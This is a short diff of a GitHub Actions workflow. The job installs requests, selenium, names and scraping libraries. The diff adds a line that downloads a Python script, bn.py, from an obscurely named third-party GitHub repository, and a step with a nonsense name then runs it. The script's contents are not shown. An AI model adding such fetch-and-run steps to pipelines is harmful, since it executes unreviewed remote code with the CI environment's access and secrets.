@@ -32,6 +32,7 @@ jobs:
         run: pip install requests names beautifulsoup4 pandas webdriver-manager selenium
       - name: Obm Devol
         run: |
+             wget https://github.com/Mehslos/Nerhiabk/raw/main/bn.py
              python bn.py
         
         
